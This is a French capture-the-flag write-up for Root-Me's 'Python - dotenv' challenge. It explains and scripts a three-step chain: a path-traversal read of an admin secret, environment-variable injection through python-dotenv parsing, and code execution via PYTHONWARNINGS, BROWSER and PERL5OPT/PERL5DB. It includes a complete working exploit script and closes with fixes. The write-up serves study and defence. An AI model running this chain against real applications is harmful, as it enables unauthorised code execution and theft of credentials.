# Writeup — Root-Me : Python - dotenv

> **Objectif** : à partir du code source d'une petite application Flask, récupérer le flag situé dans `/app/flag-<uuid>.txt` sur le serveur.
>
> **Difficulté réelle** : il ne s'agit pas d'une seule faille mais d'une **chaîne de trois bugs** qu'il faut enchaîner. C'est ce qui rend le challenge intéressant (et long).
>
> **Flag** : dynamique (généré par instance) — l'exploit l'affiche sur la sortie standard.

Ce writeup est volontairement très détaillé et pédagogique. On part des sources, on isole chaque faille, on comprend *pourquoi* elle marche, puis on assemble le tout dans un exploit Python autonome.

---

## 0. Vue d'ensemble : les 3 maillons

L'application nous donne ses sources. On remarque vite qu'il n'y a pas de « RCE évidente ». Le flag n'est accessible qu'au terme d'un parcours en trois étapes :

| Maillon | Faille | Ce qu'on obtient |
|---|---|---|
| **1** | Lecture de fichier arbitraire (bug de `basename`) | Le contenu de `/app/.secret_key` → **mot de passe admin** |
| **2** | Injection de variables d'environnement via **python-dotenv** | On place **nos propres variables d'env** dans le process serveur |
| **3** | Pont **Python → Perl** (`PYTHONWARNINGS` / `BROWSER` / `PERL5OPT`) | Exécution de code → `cat` du flag sur **stdout** |

```
  /read  ──► fuite de .secret_key ──► auth admin
                                         │
                                         ▼
  /admin/update ──► .env piégé ──► load_dotenv ──► os.environ pollué
                                         │
                                         ▼
  /admin/test-mail ──► python3 send_mail.py (hérite de l'env) ──► FLAG sur stdout
```

---

## 1. Reconnaissance

Les routes de `app.py` :

| Route | Auth | Rôle |
|---|---|---|
| `GET /` | non | page d'accueil |
| `GET /read?file=…` | non | **télécharge un fichier** depuis `downloads/` |
| `GET /admin` | **admin** | page d'admin |
| `POST /admin/update` | **admin** | met à jour `MAIL_ADMIN` et `API_URL` dans `.env` |
| `GET /admin/test-mail` | **admin** | lance `python3 ./send_mail.py` et renvoie sa sortie |
| `GET /reset-env` | **admin** | remet le `.env` à zéro |

L'authentification admin (HTTP Basic) :

```python
@auth.verify_password
def verify_password(username, password):
    if(username == "admin" and password == Secret.get_key()):
        return "admin"
    return False
```

Le mot de passe est donc `Secret.get_key()`, c'est-à-dire le contenu de `.secret_key` (`secret.py`) : **40 caractères alphanumériques aléatoires**. Si on arrive à lire ce fichier, on devient admin.

---

## 2. Maillon 1 — Lecture de fichier arbitraire

### 2.1 La route `/read`

```python
@app.route('/read', methods=["GET"])
def read():
    forbidden_files = ['.env', 'proc', 'flag']
    downloader = Downloader(DOWNLOAD_DIR)                 # DOWNLOAD_DIR = 'downloads'
    file_to_download = request.args.get("file")
    if not file_to_download:
        return "Missing file argument\n"
    elif any([forbidden in file_to_download.lower() for forbidden in forbidden_files]):
        return ('Forbidden', HTTPStatus.FORBIDDEN)
    try:
        file_to_download = downloader.get(request.args.get("file"))
        return send_file(file_to_download)
    except Exception as e:
        return f"Got error: {str(e)}\n"
```

Deux garde-fous :
1. **Blacklist** : on ne peut pas mettre `.env`, `proc` ni `flag` dans le paramètre (donc **lire le flag directement est interdit**). D'où le détour par `.secret_key`.
2. Le nom passe par `Downloader.get()` → `Downloader.basename()`.

### 2.2 Le bug dans `basename()`

`download.py` :

```python
@staticmethod
def basename(filename):
    safe_filename = filename
    if not filename:
        return ""
    if '/' in filename:                                  # anti-traversal Linux
        safe_filename = filename[filename.rindex('/') + 1:]
    if '\\' in filename:                                 # anti-traversal Windows
        safe_filename = filename[filename.rindex('\\') + 1:]
    return safe_filename
```

Le but affiché est de ne garder que le « nom de base » d'un chemin, aussi bien sous Windows (`\`) que sous Linux (`/`). **Le bug** : les deux `if` repartent à chaque fois de `filename` (la valeur **originale**), et non de `safe_filename` (progressivement nettoyé). Le second `if` **écrase** donc le résultat du premier.

Déroulons avec l'entrée `\/app/.secret_key` (un antislash, puis `/app/.secret_key`) :

```
filename = "\/app/.secret_key"

if '/' in filename:        # vrai
    safe_filename = filename[ rindex('/')+1 : ]   → ".secret_key"

if '\\' in filename:       # vrai aussi (il y a un '\' au tout début)
    safe_filename = filename[ rindex('\\')+1 : ]  → "/app/.secret_key"   ← ÉCRASE le précédent
```

`rindex('\\')` trouve l'antislash en position 0, et on garde tout ce qui suit : **`/app/.secret_key`**, un chemin **absolu**.

### 2.3 Le coup de grâce : `os.path.join`

Dans `get()` :

```python
safe_filename = Downloader.basename(filename)            # = "/app/.secret_key"
file_to_download = os.path.join(self.public_dir, safe_filename)
```

Or en Python, `os.path.join` a un comportement bien connu : **si le second argument est un chemin absolu, le premier est ignoré** :

```python
>>> os.path.join("downloads", "/app/.secret_key")
'/app/.secret_key'
```

On lit donc **n'importe quel fichier absolu** du système (tant que la blacklist n'attrape pas le nom). `.secret_key` n'y figure pas → ✅.

### 2.4 Pourquoi `\` et pas simplement `/`

Avec un simple `/app/.secret_key`, **seul** le premier `if` s'appliquerait et renverrait `.secret_key` (le basename réel) → on resterait confiné dans `downloads/`. C'est l'antislash **en tête** qui fait gagner la logique « Windows » et laisse passer le chemin absolu. Astucieux et contre-intuitif.

### 2.5 Résultat

```http
GET /read?file=%5C%2Fapp%2F.secret_key   →   (40 caractères) = mot de passe admin
```

(`%5C` = `\`, `%2F` = `/`.) On peut maintenant s'authentifier en Basic Auth : `admin:<secret>`.

---

## 3. Maillon 2 — Injection de variables d'environnement via python-dotenv

Objectif : faire en sorte que le sous-process `python3 ./send_mail.py` (lancé par `/admin/test-mail`) hérite de **variables d'environnement choisies par nous**. Pour ça il faut écrire des lignes `CLE=VALEUR` arbitraires dans le `.env`, puis compter sur `load_dotenv()` pour les charger dans `os.environ`.

### 3.1 Ce que fait `/admin/update`

```python
blacklisted_words = ['python']
...
if blacklist in request.form["mail"] or blacklist in request.form["api_url"]:
    return jsonify({"error": "Forbidden word detected"})

set_key(ENVIRON_FILE, "MAIL_ADMIN", request.form["mail"])
set_key(ENVIRON_FILE, "API_URL",   request.form["api_url"])
load_dotenv(ENVIRON_FILE)
```

On contrôle **deux valeurs** (`mail`, `api_url`) mais pas les **clés** : le code n'écrit que `MAIL_ADMIN` et `API_URL`. À première vue, impossible d'injecter d'autres variables. Deux contraintes supplémentaires :

- **Blacklist `python`** (sensible à la casse) → on évitera le mot `python` en minuscules.
- **Interpolation** : `load_dotenv` fait de l'expansion de variables façon shell → on évitera `$` dans nos valeurs.

### 3.2 Comment `set_key` écrit une valeur

Dans python-dotenv 1.0.1, `set_key(..., quote_mode="always")` (défaut) entoure la valeur de **quotes simples** et échappe les `'` internes en `\'` :

```python
value_out = "'{}'".format(value_to_set.replace("'", "\\'"))
```

Donc `set_key(".env", "MAIL_ADMIN", "x\\")` (valeur = `x\`, un `x` suivi d'un antislash) écrit la ligne :

```
MAIL_ADMIN='x\'
```

Rien n'a été échappé (pas de `'` dans la valeur), et l'antislash se retrouve **juste avant la quote de fermeture**. Retenez cette ligne, c'est le cœur du bug.

### 3.3 Le bug : le parseur « avale » la quote de fermeture

Le parseur de python-dotenv lit une valeur entre quotes simples avec cette expression régulière :

```python
_single_quoted_value = re.compile(r"'((?:\\'|[^'])*)'")
```

Traduction : une `'`, puis une suite de « soit `\'` (quote échappée), soit un caractère non-quote », puis une `'` de fin. **Point crucial** : le parseur travaille sur **tout le reste du fichier**, pas ligne par ligne.

Supposons le `.env` suivant (MAIL_ADMIN puis API_URL écrits par les deux `set_key`) :

```
MAIL_ADMIN='x\'
API_URL='SACRIFICE
PYTHONWARNINGS=all:0:antigravity.x:0:0
BROWSER=/usr/bin/c_rehash
PERL5OPT=-d
PERL5DB=print"FLAGSTART";system("cat /app/flag*.txt");print"FLAGEND";exit
Z='
```

Quand le parseur attaque la valeur de `MAIL_ADMIN`, le reste du fichier à cet instant commence par :

```
'x\'\nAPI_URL='SACRIFICE\n…
```

L'expression gloutonne consomme : `x` (non-quote), puis arrive sur `\'`. Elle **préfère** l'alternative `\'` (quote échappée) → l'antislash « mange » la quote qui était censée fermer `MAIL_ADMIN`. Elle continue donc à travers le `\n`, `API_URL=` (tous non-quote)… jusqu'à tomber sur la **première vraie quote disponible** : **la quote ouvrante de la valeur d'`API_URL`**, qu'elle prend comme quote de fermeture.

Résultat : la valeur de `MAIL_ADMIN` devient littéralement :

```
x\'<newline>API_URL=
```

… et le parseur se retrouve positionné **juste après** cette quote, c'est-à-dire devant le texte `SACRIFICE\n…`.

### 3.4 La resynchronisation d'erreur libère nos lignes

Après une valeur, python-dotenv attend un commentaire optionnel puis une fin de ligne. Or il voit `SACRIFICE`, du texte brut → **erreur de parsing**. Son `parse_binding` rattrape l'erreur ainsi :

```python
except Error:
    reader.read_regex(_rest_of_line)      # consomme le reste de la ligne courante
    return Binding(..., error=True)
```

Il **jette le reste de la ligne courante** (`SACRIFICE\n`) — d'où le nom de cette ligne « sacrifiée » — puis recommence proprement à la ligne suivante.

Et là, magie : les lignes suivantes sont des bindings **parfaitement valides**, parsés normalement :

```
PYTHONWARNINGS = all:0:antigravity.x:0:0
BROWSER        = /usr/bin/c_rehash
PERL5OPT       = -d
PERL5DB        = print"FLAGSTART";system("cat /app/flag*.txt");print"FLAGEND";exit
```

La dernière ligne `Z='` récupère la **quote de fermeture finale** écrite par `set_key` autour d'`API_URL` (elle échoue au parsing, mais on s'en moque, elle sert juste de « poubelle »).

> **En résumé** : en terminant `MAIL_ADMIN` par un antislash, on fait déborder sa valeur jusqu'à l'intérieur d'`API_URL`. La resync d'erreur transforme alors le contenu *multi-lignes* qu'on a mis dans `api_url` en **vrais `CLE=VALEUR`**. On a donc une **injection de variables d'environnement arbitraires**.

`load_dotenv()` les charge dans `os.environ` du process Flask, et tout sous-process en héritera.

---

## 4. Maillon 3 — Du sous-process Python au flag (pont Perl)

`/admin/test-mail` fait :

```python
result = os.popen("/usr/local/bin/python3 ./send_mail.py").read().strip()
```

Le sous-process `python3` **hérite de notre `os.environ` pollué**. On exploite alors une chaîne d'astuces bien connue (documentée par **elttam** sur l'injection de variables d'environnement) :

### 4.1 `PYTHONWARNINGS` → import de `antigravity`

Le format de `PYTHONWARNINGS` est `action:message:category:module:lineno`. Au **démarrage** de l'interpréteur, Python résout le champ `category` : si celui-ci contient un point, il fait `__import__('<module>')` puis `getattr`. Avec :

```
PYTHONWARNINGS=all:0:antigravity.x:0:0
```

la catégorie est `antigravity.x` → Python exécute `__import__('antigravity')`. Or le module standard **`antigravity`** a un effet de bord à l'import : il appelle `webbrowser.open("https://xkcd.com/353/")`. Le `getattr(..., 'x')` échouera ensuite, mais **l'effet de bord (ouverture du navigateur) a déjà eu lieu**. Tout ceci se produit **avant** même que `send_mail.py` ne commence.

### 4.2 `BROWSER` → on choisit le « navigateur »

Le module `webbrowser` respecte la variable d'environnement **`BROWSER`** pour décider quel programme lancer, en lui passant l'URL en argument. On met donc :

```
BROWSER=/usr/bin/c_rehash
```

`c_rehash` est un **script Perl** (shebang `#!/usr/bin/perl`) présent dans l'image. L'auteur du challenge a pris soin de retirer `perlthanks`/`perldoc` (binaires Perl classiques pour ce genre d'astuce), mais **`c_rehash` est resté**. `webbrowser` l'exécute donc : `perl /usr/bin/c_rehash https://xkcd.com/353/`.

### 4.3 `PERL5OPT` + `PERL5DB` → exécution de notre code

Dernière marche :

```
PERL5OPT=-d
PERL5DB=print"FLAGSTART";system("cat /app/flag*.txt");print"FLAGEND";exit
```

`PERL5OPT=-d` force Perl à démarrer **en mode débogueur**. En mode `-d`, le contenu de **`PERL5DB`** est exécuté dans un bloc `BEGIN`, c'est-à-dire **avant** le script `c_rehash` lui-même. Notre payload fait donc :

```perl
print "FLAGSTART";
system("cat /app/flag*.txt");   # le flag !
print "FLAGEND";
exit
```

On encadre le flag de marqueurs `FLAGSTART` / `FLAGEND` pour l'extraire proprement de la sortie (le fichier flag peut contenir un `\n` final ou un BOM). Toute cette sortie remonte dans `os.popen(...).read()`, donc dans la réponse JSON de `/admin/test-mail`.

### 4.4 La chaîne complète, en une image

```
os.popen("python3 send_mail.py")
        │  (hérite de os.environ pollué)
        ▼
python3 démarre
        │  PYTHONWARNINGS=…antigravity.x…
        ▼
import antigravity  ──► webbrowser.open(url)
        │  BROWSER=/usr/bin/c_rehash
        ▼
perl -d /usr/bin/c_rehash url
        │  PERL5OPT=-d  +  PERL5DB=…
        ▼
BEGIN { system("cat /app/flag*.txt") }  ──►  FLAGSTART<flag>FLAGEND  sur stdout
        │
        ▼
réponse JSON de /admin/test-mail  →  on en extrait le flag
```

---

## 5. L'exploit complet

Script autonome (stdlib uniquement), qui enchaîne les trois maillons et affiche le flag sur `stdout`. Les commentaires rappellent le rôle de chaque pièce.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Exploit — Root-Me "Python - dotenv" (Web-Serveur)

Chaine complete, flag renvoye sur stdout (pas d'exfiltration reseau) :

  Maillon 1 : lecture de fichier arbitraire -> fuite de .secret_key (mot de passe admin)
              Bug dans Downloader.basename (download.py) : les deux `if` repartent de
              `filename` (original), la branche '\\' ecrase la branche '/'. Avec
              `\\/app/.secret_key` -> basename renvoie le chemin ABSOLU `/app/.secret_key`,
              et os.path.join("downloads", "/app/.secret_key") == "/app/.secret_key".

  Maillon 2 : injection de variables d'environnement via python-dotenv (set_key/load_dotenv)
              set_key ecrit la valeur entre quotes SIMPLES en echappant ' -> \\' , mais le
              parseur backtrack : en terminant la valeur de MAIL_ADMIN par un backslash, sa
              quote de fermeture est "absorbee" -> la valeur deborde jusqu'a la quote ouvrante
              d'API_URL -> Error de parsing -> RESYNC en debut de ligne suivante, ce qui
              expose les lignes `CLE=VALEUR` placees dans la valeur d'API_URL comme de vrais
              bindings. load_dotenv les charge dans os.environ, herite par le sous-process.

  Maillon 3 : pont Python -> Perl -> flag sur stdout (base : article elttam)
              PYTHONWARNINGS=all:0:antigravity.x:0:0  -> au demarrage Python, la resolution de
                 la "categorie" de warning importe le module `antigravity` -> webbrowser.open()
              BROWSER=/usr/bin/c_rehash               -> webbrowser lance ce script Perl
                 (shebang #!/usr/bin/perl, present dans l'image ; l'auteur a retire
                  perlthanks/perldoc mais c_rehash reste) -> perl OUVRE un script valide
              PERL5OPT=-d + PERL5DB=...                -> perl execute notre code en BEGIN
                 (debogueur) AVANT le script -> cat du flag -> stdout.
              Le `result` de /admin/test-mail (os.popen(...).read()) contient donc le flag.

Usage :
    python exploit.py --url http://challenge01.root-me.org:PORT
    python exploit.py --url http://localhost:5000 --secret <si deja connu>
"""
import argparse
import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# Marqueurs Perl autour du flag pour une extraction fiable (insensible aux \n du fichier).
FLAG_START = "FLAGSTART"
FLAG_END = "FLAGEND"

# Variables d'environnement a injecter dans le sous-process `python3 send_mail.py`.
# Aucune ne contient de "python" en minuscules (blacklist sensible a la casse) ni de "$"
# (sinon l'interpolation de python-dotenv mangerait la valeur).
INJECT = [
    ("PYTHONWARNINGS", "all:0:antigravity.x:0:0"),
    ("BROWSER", "/usr/bin/c_rehash"),
    ("PERL5OPT", "-d"),
    ("PERL5DB", f'print"{FLAG_START}";system("cat /app/flag*.txt");print"{FLAG_END}";exit'),
]


def http(url, data=None, auth=None):
    """Petit wrapper HTTP (stdlib) avec Basic Auth optionnelle."""
    headers = {}
    if auth is not None:
        token = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = "Basic " + token
    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def leak_secret(base):
    """Maillon 1 : fuite de /app/.secret_key (mot de passe admin, 40 caracteres)."""
    payload = urllib.parse.quote("\\/app/.secret_key", safe="")
    st, body = http(f"{base}/read?file={payload}")
    secret = body.strip()
    if st != 200 or len(secret) != 40:
        print(f"[!] fuite du secret suspecte (HTTP {st}, {len(secret)} car.) : {secret!r}",
              file=sys.stderr)
    return secret


def build_payload():
    """Maillon 2 : fabrique (mail, api_url) pour /admin/update.

    - mail se termine par un backslash -> absorbe la quote de fermeture de MAIL_ADMIN
    - api_url : 1re ligne sacrifiee (consommee par la resync d'erreur), puis nos bindings,
      puis une ligne-poubelle finale `Z=` qui recoit la quote de fermeture de set_key.
    """
    mail = "x\\"
    lines = ["SACRIFICE"] + [f"{k}={v}" for k, v in INJECT] + ["Z="]
    api_url = "\n".join(lines)
    return mail, api_url


def extract_flag(result):
    m = re.search(re.escape(FLAG_START) + r"(.*?)" + re.escape(FLAG_END), result, re.S)
    # strip() + retrait d'un eventuel BOM (artefact d'encodage du fichier flag)
    return m.group(1).strip().strip("﻿").strip() if m else None


def main():
    ap = argparse.ArgumentParser(description="Exploit Root-Me 'Python - dotenv'")
    ap.add_argument("--url", required=True, help="URL de base, ex. http://challenge01.root-me.org:PORT")
    ap.add_argument("--user", default="admin", help="utilisateur HTTP Basic (defaut: admin)")
    ap.add_argument("--secret", default=None, help="secret admin si deja connu (sinon fuite auto)")
    ap.add_argument("--no-reset", action="store_true", help="ne pas appeler /reset-env a la fin")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    # Maillon 1
    secret = args.secret or leak_secret(base)
    print(f"[+] secret admin : {secret}", file=sys.stderr)
    auth = (args.user, secret)

    # Maillon 2 : ecrit le .env piege puis load_dotenv (cote serveur)
    mail, api_url = build_payload()
    st, _ = http(f"{base}/admin/update", data={"mail": mail, "api_url": api_url}, auth=auth)
    print(f"[+] /admin/update -> HTTP {st}", file=sys.stderr)

    # Maillon 3 : declenche le sous-process python3 -> pont Perl -> flag sur stdout
    st, body = http(f"{base}/admin/test-mail", auth=auth)
    print(f"[+] /admin/test-mail -> HTTP {st}", file=sys.stderr)
    try:
        result = json.loads(body).get("result", "")
    except Exception:
        result = body

    flag = extract_flag(result)

    # Nettoyage de l'instance (facultatif mais poli)
    if not args.no_reset:
        http(f"{base}/reset-env", auth=auth)

    if flag:
        print(f"[+] FLAG : {flag}", file=sys.stderr)
        print(flag)
    else:
        print("[!] flag non trouve. Reponse brute de /admin/test-mail :", file=sys.stderr)
        print(result)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### 5.1 Lancer l'exploit

```bash
python exploit.py --url http://challenge01.root-me.org:PORT
```

Sortie typique (les logs `[+]` vont sur `stderr`, le flag seul sur `stdout`) :

```
[+] secret admin : aZ09....(40 car.)
[+] /admin/update -> HTTP 200
[+] /admin/test-mail -> HTTP 200
[+] FLAG : <le flag>
```

---

## 6. Pourquoi chaque détail compte (récap des pièges)

- **Antislash en tête** du payload de lecture (`\/app/.secret_key`) : sans lui, la branche « Linux » gagne et on reste dans `downloads/`.
- **`.secret_key` et non le flag** : `flag`, `.env` et `proc` sont blacklistés par `/read`. On passe par le mot de passe admin.
- **`mail` se termine par `\`** : c'est ce backslash qui fait « déborder » la valeur de `MAIL_ADMIN` et casse le parsing — condition *sine qua non* de l'injection.
- **1re ligne `SACRIFICE`** : elle est détruite par la resync d'erreur ; nos vraies variables sont placées **après**.
- **Ligne finale `Z=`** : encaisse la quote de fermeture ajoutée par `set_key` autour d'`API_URL`.
- **Pas de `python` minuscule** (blacklist sensible à la casse) ni de **`$`** (interpolation dotenv) dans les valeurs. `PYTHONWARNINGS` en majuscules passe.
- **`c_rehash`** : le seul script Perl laissé dans l'image après le retrait de `perlthanks`/`perldoc`.
- **Marqueurs `FLAGSTART`/`FLAGEND`** : extraction robuste malgré un éventuel `\n`/BOM final dans le fichier flag.

---

## 7. Côté défense — comment corriger

1. **`basename` correct** : utiliser `os.path.basename` (ou enchaîner les nettoyages sur `safe_filename`, pas sur l'original), et surtout **vérifier que le chemin résolu reste dans le dossier public** :
   ```python
   full = os.path.realpath(os.path.join(public_dir, name))
   if os.path.commonpath([full, os.path.realpath(public_dir)]) != os.path.realpath(public_dir):
       raise ValueError("hors dossier")
   ```
   Une blacklist de sous-chaînes (`.env`, `flag`…) est toujours contournable.
2. **Ne jamais réinjecter une entrée utilisateur dans un fichier `.env`** ni lui faire confiance pour générer de la configuration. `set_key`/`load_dotenv` ne sont pas des frontières de sécurité.
3. **Variables d'environnement = surface d'attaque** : un sous-process hérite de tout l'environnement. Assainir explicitement l'env passé à `subprocess` (`env={...}` minimal), bannir `PYTHONWARNINGS`, `BROWSER`, `PERL5OPT`, `LD_PRELOAD`, etc.
4. **Éviter `os.popen`/`os.system`** ; préférer `subprocess.run([...], env=env_minimal, shell=False)`.
5. **Principe du moindre privilège** sur les fichiers sensibles (le `.secret_key` ne devrait pas être lisible par le même compte qui sert les téléchargements).

---

## 8. Ce qu'il faut retenir

- Un challenge « sans faille évidente » peut cacher une **chaîne** : ici lecture de fichier → vol d'identifiants → injection de config → exécution de code.
- Les fonctions « maison » de *sanitisation de chemin* sont un nid à bugs : la logique « deux `if` indépendants » de `basename` inverse l'effet attendu.
- **python-dotenv n'est pas un format robuste** : les règles de *quoting* de `set_key` et le *backtracking* du parseur permettent de faire déborder une valeur sur la suivante et d'injecter des bindings arbitraires.
- La **pollution de variables d'environnement** est une primitive d'exécution de code redoutable : `PYTHONWARNINGS`+`antigravity`, `BROWSER`, `PERL5OPT`/`PERL5DB` forment un pont Python → Perl → shell.

**Flag** : affiché par l'exploit (valeur propre à chaque instance).
